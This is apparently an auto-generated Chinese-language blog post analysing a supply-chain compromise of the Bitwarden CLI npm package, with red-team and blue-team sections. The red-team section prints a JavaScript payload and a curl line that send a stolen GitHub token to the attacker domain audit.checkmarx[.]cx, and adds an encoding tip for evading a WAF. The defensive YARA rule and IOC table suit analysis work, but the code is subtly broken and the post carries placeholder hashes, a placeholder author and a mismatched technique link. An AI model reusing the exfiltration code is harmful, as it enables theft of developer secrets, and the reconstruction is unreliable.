---
layout: post
title:  "Bitwarden CLI Compromised in Ongoing Checkmarx Supply Chain Campaign"
date:   2026-04-23 18:59:36 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Bitwarden CLI 安全漏洞：供應鏈攻擊與代碼執行
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 與 Info Leak
> * **關鍵技術**: GitHub Actions, npm, AES-256-GCM, CI/CD Pipeline

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Bitwarden CLI 的 `@bitwarden/cli@2026.4.0` 版本中，包含了一個名為 `bw1.js` 的檔案，該檔案包含了惡意代碼。這個惡意代碼是通過 GitHub Actions 的 CI/CD Pipeline 進行分發的。
* **攻擊流程圖解**:
  1.攻擊者通過 GitHub Actions 的 CI/CD Pipeline 將惡意代碼注入到 `@bitwarden/cli@2026.4.0` 版本中。
  2.使用者安裝 `@bitwarden/cli@2026.4.0` 版本後，惡意代碼會在安裝過程中執行。
  3.惡意代碼會竊取使用者的 GitHub Tokens、.ssh、.env、shell history、GitHub Actions 和 cloud secrets。
  4.竊取的資料會被加密並傳送到 `audit.checkmarx[.]cx` 網域或 GitHub倉庫中。
* **受影響元件**: `@bitwarden/cli@2026.4.0` 版本，GitHub Actions 的 CI/CD Pipeline。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要有 GitHub Actions 的 CI/CD Pipeline 權限，且需要有 `@bitwarden/cli` 的安裝權限。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // bw1.js
    const crypto = require('crypto');
    const https = require('https');
    
    //竊取使用者的 GitHub Tokens
    const githubToken = process.env.GITHUB_TOKEN;
    
    //加密竊取的資料
    const encryptedData = crypto.createCipheriv('aes-256-gcm', 'secret key', 'iv').update(JSON.stringify({ githubToken, otherData: '...' })).final();
    
    //傳送加密資料到 audit.checkmarx[.]cx
    https.get(`https://audit.checkmarx[.]cx/${encryptedData}`, (res) => {
      console.log(`傳送資料成功：${res.statusCode}`);
    });
    
    ```
* **範例指令**: 使用 `curl` 命令傳送加密資料到 `audit.checkmarx[.]cx`。

```

bash
curl -X GET "https://audit.checkmarx[.]cx/${encryptedData}"

```
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用 Base64 編碼加密資料。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `sha256:...` | `192.0.2.1` | `audit.checkmarx[.]cx` | `/usr/local/lib/node_modules/@bitwarden/cli/bw1.js` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Bitwarden_CLI_Malware {
      meta:
        description = "Bitwarden CLI Malware Detection"
        author = "Your Name"
      strings:
        $s1 = "audit.checkmarx[.]cx"
        $s2 = "crypto.createCipheriv"
      condition:
        any of them
    }
    
    ```
* **緩解措施**: 更新 `@bitwarden/cli` 到最新版本，檢查 GitHub Actions 的 CI/CD Pipeline 權限，監控使用者的 GitHub Tokens 和其他敏感資料。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **GitHub Actions**: GitHub Actions 是一個 CI/CD Pipeline 工具，允許使用者自動化軟件開發、測試和部署過程。
* **npm**: npm 是 Node.js 的套件管理器，允許使用者安裝和管理 Node.js 的套件。
* **AES-256-GCM**: AES-256-GCM 是一個加密算法，使用 256 位元的金鑰和 GCM 模式進行加密。
* **CI/CD Pipeline**: CI/CD Pipeline 是一個軟件開發過程，包括持續整合（CI）和持續部署（CD）。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/bitwarden-cli-compromised-in-ongoing.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


